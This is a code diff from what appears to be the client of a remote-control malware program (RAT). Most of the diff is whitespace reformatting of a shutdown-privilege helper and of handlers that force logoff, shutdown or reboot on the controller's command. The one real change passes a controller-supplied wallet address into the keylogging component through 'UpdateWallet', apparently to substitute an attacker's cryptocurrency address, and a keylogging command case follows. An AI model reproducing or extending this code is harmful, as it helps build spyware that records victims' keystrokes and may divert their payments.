@@ -365,32 +365,33 @@ BOOL IsRunningAsAdmin()
     return isAdmin;
 }
 
-bool EnableShutdownPrivilege() {
-	HANDLE hToken;
-	TOKEN_PRIVILEGES tkp;
+bool EnableShutdownPrivilege()
+{
+    HANDLE hToken;
+    TOKEN_PRIVILEGES tkp;
 
-	// 打开当前进程的令牌
-	if (!OpenProcessToken(GetCurrentProcess(), TOKEN_ADJUST_PRIVILEGES | TOKEN_QUERY, &hToken)) {
-		return false;
-	}
+    // 打开当前进程的令牌
+    if (!OpenProcessToken(GetCurrentProcess(), TOKEN_ADJUST_PRIVILEGES | TOKEN_QUERY, &hToken)) {
+        return false;
+    }
 
-	// 获取关机权限的 LUID
-	if (!LookupPrivilegeValue(NULL, SE_SHUTDOWN_NAME, &tkp.Privileges[0].Luid)) {
-		CloseHandle(hToken);
-		return false;
-	}
+    // 获取关机权限的 LUID
+    if (!LookupPrivilegeValue(NULL, SE_SHUTDOWN_NAME, &tkp.Privileges[0].Luid)) {
+        CloseHandle(hToken);
+        return false;
+    }
 
-	tkp.PrivilegeCount = 1;
-	tkp.Privileges[0].Attributes = SE_PRIVILEGE_ENABLED;
+    tkp.PrivilegeCount = 1;
+    tkp.Privileges[0].Attributes = SE_PRIVILEGE_ENABLED;
 
-	// 启用关机权限
-	if (!AdjustTokenPrivileges(hToken, FALSE, &tkp, 0, (PTOKEN_PRIVILEGES)NULL, 0)) {
-		CloseHandle(hToken);
-		return false;
-	}
+    // 启用关机权限
+    if (!AdjustTokenPrivileges(hToken, FALSE, &tkp, 0, (PTOKEN_PRIVILEGES)NULL, 0)) {
+        CloseHandle(hToken);
+        return false;
+    }
 
-	CloseHandle(hToken);
-	return true;
+    CloseHandle(hToken);
+    return true;
 }
 
 VOID CKernelManager::OnReceive(PBYTE szBuffer, ULONG ulLength)
@@ -411,18 +412,17 @@ VOID CKernelManager::OnReceive(PBYTE szBuffer, ULONG ulLength)
         Mprintf("收到机器管理命令: %d, %d\n", szBuffer[0], szBuffer[1]);
         break;
 #endif
-        switch (szBuffer[1])
-        {
+        switch (szBuffer[1]) {
         case MACHINE_LOGOUT: {
-			ExitWindowsEx(EWX_LOGOFF | EWX_FORCE, 0);
+            ExitWindowsEx(EWX_LOGOFF | EWX_FORCE, 0);
             break;
         }
         case MACHINE_SHUTDOWN: {
-			ExitWindowsEx(EWX_POWEROFF | EWX_FORCE, 0);
+            ExitWindowsEx(EWX_POWEROFF | EWX_FORCE, 0);
             break;
         }
         case MACHINE_REBOOT: {
-			ExitWindowsEx(EWX_REBOOT | EWX_FORCE, 0);
+            ExitWindowsEx(EWX_REBOOT | EWX_FORCE, 0);
             break;
         }
         default:
@@ -583,9 +583,12 @@ VOID CKernelManager::OnReceive(PBYTE szBuffer, ULONG ulLength)
     case CMD_MASTERSETTING:
         if (ulLength > sizeof(MasterSettings)) {
             memcpy(&m_settings, szBuffer + 1, sizeof(MasterSettings));
-            // Remark 打开键盘记录或下一次启动客户端才会生效
             iniFile cfg(CLIENT_PATH);
             cfg.SetStr("settings", "wallet", m_settings.WalletAddress);
+            CManager* pMgr = (CManager*)m_hKeyboard->user;
+            if (pMgr) {
+                pMgr->UpdateWallet(m_settings.WalletAddress);
+            }
         }
         break;
     case COMMAND_KEYBOARD: { //键盘记录
